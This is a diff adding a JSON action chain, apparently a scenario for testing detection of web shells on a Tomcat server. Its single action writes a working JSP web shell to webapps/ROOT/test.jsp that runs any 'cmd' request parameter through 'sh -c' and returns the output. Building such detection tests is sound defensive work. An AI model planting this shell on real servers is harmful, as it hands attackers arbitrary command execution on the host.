@@ -1,0 +1,19 @@
+{
+  "chain_id": "content_upload_webshell_runtime_discovery_001",
+  "actions": [
+    {
+      "action_id": "prepare_uploaded_root_webshell",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/webapps/ROOT/test.jsp",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 0.3,
+      "content": "<%@ page import=\"java.io.*\" %>\n<%\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null && !cmd.trim().isEmpty()) {\n    Process p = new ProcessBuilder(\"sh\", \"-c\", cmd).redirectErrorStream(true).start();\n    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String line;\n    while ((line = reader.readLine()) != null) {\n        out.println(line);\n    }\n}\n%>\n"
+    }
+  ]
+}
+
+
+
+
